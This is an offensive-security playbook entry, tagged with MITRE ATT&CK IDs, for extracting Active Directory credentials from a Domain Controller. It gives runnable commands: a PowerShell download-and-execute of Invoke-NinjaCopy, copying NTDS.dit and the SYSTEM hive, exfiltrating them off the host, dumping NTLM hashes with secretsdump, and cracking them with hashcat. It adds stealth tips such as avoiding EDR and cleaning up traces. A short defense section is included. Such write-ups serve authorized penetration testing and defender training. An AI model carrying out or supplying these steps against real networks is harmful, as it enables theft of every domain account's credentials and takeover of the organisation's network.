---
id: ab26cc02-4da5-44c7-83e2-eedbc5e86a70
name: Dump-NTDS-dit-for-AD-Credential-Extraction
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:03.782103+00:00'
updated_at: '2023-04-10T20:36:03.346161+00:00'
tactics:
  - '[[tactics/Credential Access|TA0006 - Credential Access]]'
techniques:
  - '[[techniques/Credential Dumping|T1003 - Credential Dumping]]'
  - '[[techniques/Credentials in Files|T1081 - Credentials in Files]]'
sub_techniques: []
tags:
  - '[[tags/Active Directory Attacks]]'
  - '[[tags/Dumping AD Domain Credentials]]'
commands:
  - '[[commands/ntdsutil-activate-and-info]]'
  - '[[commands/powershell-import-powersploit-ninjacopy]]'
  - '[[commands/invoke-ninjacopy-ntds-dit]]'
  - '[[commands/secretsdump-extract-ntds]]'
platforms:
  - Windows
tools:
  - '[[tools/PowerSploit]]'
  - '[[tools/Impacket]]'
validated: true
---

# Dump-NTDS-dit-for-AD-Credential-Extraction

## Summary

This procedure outlines how to extract the NTDS.dit database file and associated SYSTEM registry hive from a Windows Domain Controller to obtain NTLM password hashes for all domain user accounts. These hashes can be cracked offline using tools like Hashcat, enabling further attacks such as Pass-the-Hash. The method uses built-in tools like ntdsutil for location and PowerSploit's Invoke-NinjaCopy for stealthy file extraction, requiring Domain Admin access.

## Description

The NTDS.dit file serves as the primary database for Active Directory, storing all domain objects including user accounts and their encrypted password hashes (NTLM). Attackers target this file to perform offline cracking, as online attacks are limited by lockout policies. To avoid disrupting AD services, the procedure leverages Volume Shadow Copy Service (VSS) indirectly via tools or snapshots. The SYSTEM hive provides the boot key needed to decrypt the hashes. This technique is high-impact in domain environments, allowing compromise of the entire Active Directory forest if successful. It assumes the attacker has initial foothold as Domain Admin on the DC, often gained via prior privilege escalation.

## Requirements

1. Domain Admin privileges or local Administrator access on the Domain Controller.
2. Remote or local access to the DC (e.g., RDP, PowerShell Remoting, or WinRM enabled).
3. PowerShell execution policy allowing script imports (bypass if needed).
4. Attacker's machine with Impacket suite installed for hash extraction (Kali Linux recommended).
5. Sufficient disk space on the target for temporary copies (~100MB for files).

## Defense

- Strictly limit Domain Admin accounts and use Just-In-Time (JIT) administration via tools like Privileged Access Workstations (PAWs).
- Enable Windows Defender or EDR with behavioral monitoring for VSS snapshots, unusual file copies in %SystemRoot%\NTDS, and PowerShell downloads.
- Implement Group Managed Service Accounts (gMSAs) and disable NTLM where possible, favoring Kerberos.
- Audit file access on DCs via Advanced Audit Policy Configuration (Object Access > File System).
- Use Microsoft Defender for Identity to detect anomalous DC activity and credential dumping attempts.

## Objectives

1. Locate and copy the NTDS.dit file and SYSTEM hive without stopping AD DS service.
2. Transfer the files to an offline environment for safe extraction.
3. Parse the database to obtain crackable NTLM hashes for domain users.
4. Enable offline cracking to recover plaintext passwords for lateral movement or persistence.

## Instructions

### Step 1: Locate NTDS.dit Path Using ntdsutil

**Context**: ntdsutil is a built-in Windows tool for managing AD. This step activates the NTDS instance and reveals the exact path to NTDS.dit, confirming the target location before copying. Run this on the Domain Controller to avoid assumptions about default paths.

**Command** ([[commands/ntdsutil-activate-and-info]]):

Open an elevated Command Prompt and execute the ntdsutil sequence.

> This step verifies the database integrity and path (typically C:\Windows\NTDS\NTDS.dit). If the path differs due to custom installation, note it for the next steps. Success is indicated by the file info output without errors; failure may indicate insufficient privileges or non-DC target.

### Step 2: Import PowerSploit Invoke-NinjaCopy Module

**Context**: PowerSploit's Invoke-NinjaCopy uses Windows API calls to copy locked files (like NTDS.dit) by creating hidden VSS snapshots, bypassing antivirus file access hooks. This step downloads and loads the module into the current PowerShell session. Run in an elevated PowerShell on the DC.

**Command** ([[commands/powershell-import-powersploit-ninjacopy]]):

```powershell
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-NinjaCopy.ps1')
```

> Expected output: No errors; the function Invoke-NinjaCopy becomes available (test with Get-Command Invoke-NinjaCopy). If web access is blocked, transfer the .ps1 file manually via SMB. This step is crucial for stealth, as direct copies may trigger EDR alerts.

### Step 3: Copy NTDS.dit and SYSTEM Hive Using Invoke-NinjaCopy

**Context**: With the module loaded, copy the protected NTDS.dit and SYSTEM files to a temporary location on the DC. The SYSTEM hive (from C:\Windows\System32\config\SYSTEM) contains the decryption key (bootkey). Use a non-monitored directory like C:\temp. If C:\temp doesn't exist, create it first with New-Item.

**Command** ([[commands/invoke-ninjacopy-ntds]]):

First, copy NTDS.dit:

```powershell
Invoke-NinjaCopy -Path "C:\Windows\NTDS\ntds.dit" -LocalDestination "C:\temp\ntds.dit"
```

Then, copy SYSTEM:

```powershell
Invoke-NinjaCopy -Path "C:\Windows\System32\config\SYSTEM" -LocalDestination "C:\temp\SYSTEM"
```

> Expected output: "File copied successfully" for each. Verify with Get-Item C:\temp\ntds.dit and dir C:\temp\SYSTEM. If access denied, confirm Domain Admin rights. Clean up originals after transfer to reduce footprint, but only after exfiltration.

### Step 4: Exfiltrate Files and Extract Hashes with secretsdump

**Context**: Transfer the files off the DC to your attacker's machine (e.g., via scp, SMB share, or HTTP POST). Then, on a Linux host with Impacket installed, use secretsdump.py to parse NTDS.dit using the SYSTEM bootkey, outputting hashes in crackable format. This avoids running extraction on the DC to minimize detection.

**Command** ([[commands/secretsdump-extract-ntds]]):

```bash
python3 /usr/share/impacket/examples/secretsdump.py -system SYSTEM -ntds ntds.dit LOCAL
```

> Expected output: Lines like 'Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::'. Redirect to file with > hashes.txt for cracking. Success if hashes for known users (e.g., krbtgt) appear; errors indicate mismatched bootkey or corrupted files. Proceed to crack with Hashcat: hashcat -m 1000 hashes.txt rockyou.txt.
